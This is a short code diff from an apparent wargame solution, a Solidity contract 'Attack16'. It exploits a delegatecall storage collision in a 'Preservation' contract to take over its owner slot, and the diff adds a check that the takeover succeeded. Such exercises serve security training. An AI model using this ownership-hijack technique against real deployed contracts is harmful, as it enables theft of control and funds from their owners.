@@ -12,6 +12,7 @@ contract Attack16 {
     function attack(Preservation preservation) external {
         preservation.setFirstTime(uint256(uint160(address(this))));
         preservation.setFirstTime(uint256(uint160(msg.sender)));
+        require(preservation.owner() == msg.sender, "hack failed");
     }
 
     function setTime(uint256 _owner) external {
